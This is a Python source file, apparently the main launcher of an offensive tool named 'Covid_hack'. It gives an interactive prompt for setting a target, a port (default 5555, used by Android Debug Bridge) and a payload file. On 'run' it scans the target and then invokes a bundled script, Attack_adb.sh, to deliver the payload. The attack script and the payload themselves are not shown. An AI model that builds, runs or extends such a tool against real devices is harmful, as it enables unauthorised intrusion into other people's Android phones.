from Core.Banners import *
from Core.auto_complete import *
from Core.colors import *
from Modules.scanner import *
from Core.options_help import *
import os


os.system('clear')

# check root
def Root():
    root = os.getuid()
    if root == 0 :
        pass

    else:
        print(f'[{Red}!!{White}] Error : you must be root !! \n use " sudo " and type password next step run tool ')
        exit()

# tool 
def Covid_hack(Target='             ', PorT='5555       ',PayloaD='adb_payload.sh'):
    
    while True:
        # type commands here
        CommandComplete()
        command = input(f'Covid {Red}> {White}')
        
        # using port scan to scan port [ 5555 ]
        
        
        # type commands for scan/port

        if 'set target' in command :
            Clan = command.replace('set target ', '')
            Target = Clan
            print(f'target ==> {Red}{Clan}{White}')
            
        
        elif 'set payload' in command :
            payload = command.replace('set payload ', '')
            PayloaD = payload
            print(f'payload ==> {Red}{payload}{White}')
            

        elif 'set port' in command :
            port = command.replace('set port ', '')
            PorT = port 
            print(f'port ==> {Red}{port}{White}')
            
        
        elif command == 'show options':
            try:
                All = Optionshelp(Target, PorT, PayloaD)
                All.option_adb()
            except:
                pass

        elif command == 'help':
            Optionshelp().help()
        
        elif command == '':
            pass
        


        elif command == 'exit':
            exit()
            break
        
        elif command == 'clear':
            os.system('clear')

        elif command == 'banner':
            Covid_banner()

        elif command == 'run':
            # scan port 5555
            try:
                Scanport = Scanners(Target, PorT)
                Scanport.scan_port()
            except:
                Exscan = Scanners(Target)
                Exscan.scan_port()
                
            
            try:
                os.system(f'bash Modules/Attack_adb.sh {PayloaD} {Target} {PorT}')
            except:
                os.system(f'bash Modules/Attack_adb.sh payloads/adb_payload.sh {Target} 5555')
            


        
        else :
            print(f'{Red}[!]{White} Error command')
            
            
            

        


# banner 
Covid_banner()

# check if root or not !
Root()    

# start tool
Covid_hack()